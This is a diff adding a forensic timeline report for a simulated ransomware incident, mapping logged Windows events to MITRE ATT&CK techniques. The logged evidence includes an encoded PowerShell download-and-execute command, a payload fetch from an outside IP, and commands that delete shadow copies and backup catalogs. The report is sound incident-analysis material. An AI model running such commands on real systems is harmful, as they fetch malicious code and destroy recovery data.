@@ -1,0 +1,130 @@
+==============================================================================
+ DFIR TIMELINE RECONSTRUCTION -- SIMULATED RANSOMWARE INCIDENT
+ Generated: 2026-08-12T21:11:29
+==============================================================================
+
+ Total artifacts correlated : 20
+ Flagged as attack-relevant : 14
+
+------------------------------------------------------------------------------
+ UNIFIED TIMELINE
+------------------------------------------------------------------------------
+[ ] 2026-02-27T09:14:00  Registry (Run key)
+     HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync
+     C:\Program Files\Microsoft OneDrive\OneDrive.exe /background
+
+[ ] 2026-03-11T09:03:40  Process Creation (Sysmon/Security 4688)
+     C:\Windows\explorer.exe (PID 2104, parent C:\Windows\System32\userinit.exe)
+     C:\Windows\explorer.exe
+
+[ ] 2026-03-11T09:09:00  Process Creation (Sysmon/Security 4688)
+     C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE (PID 3312, parent C:\Windows\explorer.exe)
+     "OUTLOOK.EXE"
+
+[ ] 2026-03-11T09:11:00  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\taskhostw.exe (PID 2990, parent C:\Windows\System32\svchost.exe)
+     taskhostw.exe {WindowsUpdateCheck}
+
+[ ] 2026-03-11T09:14:00  Process Creation (Sysmon/Security 4688)
+     C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE (PID 4488, parent C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE)
+     "WINWORD.EXE" /n "C:\Users\j.morales\Downloads\Invoice_84421.docm"
+
+[!] 2026-03-11T09:14:41  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID 4602, parent C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE)
+     powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn
+     MITRE: T1566.001 / T1059.001 -- Spearphishing Attachment spawning obfuscated PowerShell [CRITICAL]
+
+[!] 2026-03-11T09:14:53  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID 4602, parent C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)
+     outbound connection to 185.220.101.47:443 (TLS)
+     MITRE: T1105 -- Ingress Tool Transfer (outbound payload retrieval) [HIGH]
+
+[ ] 2026-03-11T09:14:58  Process Creation (Sysmon/Security 4688)
+     C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe (PID 4711, parent C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)
+     C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe
+
+[!] 2026-03-11T09:15:00  Registry (Run key)
+     HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSvcHelper
+     C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe -silent
+     MITRE: T1547.001 -- Registry Run Key persistence pointing to a user-writable path [HIGH]
+
+[!] 2026-03-11T09:15:15  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\vssadmin.exe (PID 4790, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)
+     vssadmin.exe delete shadows /all /quiet
+     MITRE: T1490 -- Inhibit System Recovery (shadow copy / backup catalog deletion) [CRITICAL]
+
+[!] 2026-03-11T09:15:19  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\wbadmin.exe (PID 4803, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)
+     wbadmin.exe delete catalog -quiet
+     MITRE: T1490 -- Inhibit System Recovery (shadow copy / backup catalog deletion) [CRITICAL]
+
+[!] 2026-03-11T09:15:32  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\whoami.exe (PID 4820, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)
+     whoami.exe /all
+     MITRE: T1082 / T1018 -- System / Remote System Discovery [MEDIUM]
+
+[!] 2026-03-11T09:15:35  Process Creation (Sysmon/Security 4688)
+     C:\Windows\System32\net.exe (PID 4830, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)
+     net.exe view \\FS01-CORP
+     MITRE: T1082 / T1018 -- System / Remote System Discovery [MEDIUM]
+
+[!] 2026-03-11T09:16:20  Process Creation (Sysmon/Security 4688)
+     C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe (PID 4711, parent C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe)
+     C:\Users\j.morales\AppData\Local\Temp\svchost_upd.exe --encrypt --path=C:\Users\j.morales --path=\\FS01-CORP\Shared
+     MITRE: T1486 -- Data Encrypted for Impact [CRITICAL]
+
+[!] 2026-03-11T09:16:21  Filesystem (MFT/USN activity)
+     180 files renamed with ransomware extension across 5 directories
+     Burst pattern: high-rate sequential rename, single process handle
+     MITRE: T1486 -- Data Encrypted for Impact (mass encryption burst) [CRITICAL]
+
+[!] 2026-03-11T09:18:56.860000  Filesystem (MFT/USN activity)
+     C:\Users\j.morales\Documents\README_DECRYPT.txt
+     action=create
+     MITRE: T1491.001 -- Ransom note dropped (Internal Defacement / extortion notice) [CRITICAL]
+
+[!] 2026-03-11T09:18:58.860000  Filesystem (MFT/USN activity)
+     C:\Users\j.morales\Desktop\README_DECRYPT.txt
+     action=create
+     MITRE: T1491.001 -- Ransom note dropped (Internal Defacement / extortion notice) [CRITICAL]
+
+[!] 2026-03-11T09:19:00.860000  Filesystem (MFT/USN activity)
+     C:\Users\j.morales\Pictures\README_DECRYPT.txt
+     action=create
+     MITRE: T1491.001 -- Ransom note dropped (Internal Defacement / extortion notice) [CRITICAL]
+
+[!] 2026-03-11T09:19:02.860000  Filesystem (MFT/USN activity)
+     \\FS01-CORP\Shared\Finance\README_DECRYPT.txt
+     action=create
+     MITRE: T1491.001 -- Ransom note dropped (Internal Defacement / extortion notice) [CRITICAL]
+
+[!] 2026-03-11T09:19:04.860000  Filesystem (MFT/USN activity)
+     \\FS01-CORP\Shared\HR\README_DECRYPT.txt
+     action=create
+     MITRE: T1491.001 -- Ransom note dropped (Internal Defacement / extortion notice) [CRITICAL]
+
+------------------------------------------------------------------------------
+ MITRE ATT&CK TECHNIQUES OBSERVED
+------------------------------------------------------------------------------
+  T1491.001            occurrences: 5
+  T1490                occurrences: 2
+  T1082 / T1018        occurrences: 2
+  T1486                occurrences: 2
+  T1566.001 / T1059.001 occurrences: 1
+  T1105                occurrences: 1
+  T1547.001            occurrences: 1
+
+------------------------------------------------------------------------------
+ PREFETCH EXECUTION EVIDENCE
+------------------------------------------------------------------------------
+  WINWORD.EXE-3F2A1B0C.pf          run_count=214  last_run=2026-03-11T09:14:00
+  POWERSHELL.EXE-9A7C4E11.pf       run_count=3    last_run=2026-03-11T09:14:41
+  SVCHOST_UPD.EXE-1D5B8F02.pf      run_count=1    last_run=2026-03-11T09:14:58
+  VSSADMIN.EXE-6C3E9A44.pf         run_count=2    last_run=2026-03-11T09:15:15
+
+==============================================================================
+ VERDICT: RANSOMWARE INCIDENT CONFIRMED -- CRITICAL
+ 10 critical-severity techniques observed across the kill chain,
+ from initial access through impact. Immediate containment and
+ restoration from offline backups recommended.
+==============================================================================
